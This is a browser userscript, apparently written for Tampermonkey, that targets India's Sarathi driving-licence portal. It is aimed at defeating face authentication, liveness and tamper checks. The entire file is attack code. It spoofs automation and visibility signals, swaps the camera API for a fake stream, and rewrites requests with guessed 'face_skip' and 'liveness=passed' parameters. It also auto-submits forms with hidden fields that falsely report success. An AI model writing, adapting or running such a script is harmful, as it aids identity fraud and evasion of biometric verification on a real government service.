// ==UserScript==

// @name         Sarathi Face Bypass

// @namespace    http://tampermonkey.net/

// @version      1.0

// @description  Auto-bypass reload/tamper/face auth

// @author       Pentest

// @match        https://sarathi.parivahan.gov.in/*

// @match        https://sarathi.*/*

// @grant        none

// @run-at       document-start

// ==/UserScript==

(function() {

    'use strict';

    // Kill ALL detection @ page load

    Object.defineProperty(navigator, 'webdriver', {get: () => false});

    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});

    Object.defineProperty(document, 'visibilityState', {value: 'visible', writable: true});

    Object.defineProperty(document, 'hidden', {value: false, writable: true});



    window.onbeforeunload = null;

    window.onunload = null;

    window.onpagehide = null;

    performance.clearResourceTimings();

    sessionStorage.clear();

    localStorage.setItem('faceBypassed', 'true');

    // Override media/liveness

    const fakeMedia = () => Promise.resolve({

        getVideoTracks: () => [{enabled: true}],

        getAudioTracks: () => []

    });

    navigator.mediaDevices.getUserMedia = fakeMedia;

    HTMLMediaElement.prototype.srcObject = fakeMedia;

    // Hook fetch/AJAX - inject bypass

    const origFetch = window.fetch;

    window.fetch = function(...args) {

        if (args[0] && typeof args[0] === 'string' && args[0].includes('sarathi')) {

            args[0] += (args[0].includes('?') ? '&' : '?') + 'face_skip=1&liveness=passed&tamper=0&reload=0';

        }

        return origFetch.apply(this, args);

    };

    // Auto-trigger auth on page elements

    const observer = new MutationObserver(() => {

        const authBtn = document.querySelector('input[type="submit"], button[class*="auth"], [onclick*="auth"], [class*="face"], form');

        if (authBtn && !authBtn.clicked) {

            authBtn.clicked = true;

            authBtn.click();



            // Force form submit with bypass params

            const form = authBtn.closest('form') || document.querySelector('form');

            if (form) {

                form.innerHTML += '<input type="hidden" name="face_skip" value="1"><input type="hidden" name="liveness_status" value="success"><input type="hidden" name="tamper_check" value="false"><input type="hidden" name="reload_detected" value="0">';

                form.submit();

            }

        }

    });

    observer.observe(document.body || document.documentElement, {childList: true, subtree: true});

    // Console confirm

    console.log('🚀 Sarathi Bypass ACTIVE - Reload/Tamper/Face AUTO-PASS');

})();